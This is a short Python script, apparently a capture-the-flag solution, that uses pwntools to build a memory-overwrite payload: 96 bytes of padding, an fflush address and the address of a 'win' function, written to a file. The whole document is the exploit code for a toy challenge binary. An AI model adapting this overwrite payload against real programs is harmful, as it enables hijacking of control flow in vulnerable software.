from pwn import *

padding = 'A'.encode() * 96
fflush_address = 0x08048436
win_address = 0x080485d7



payload = padding + b'\x36\x84\04\x08\n'+ str(win_address).encode() +b'\nABCD\n'

print(payload)

with open('payload','wb') as file:
    file.write(payload)
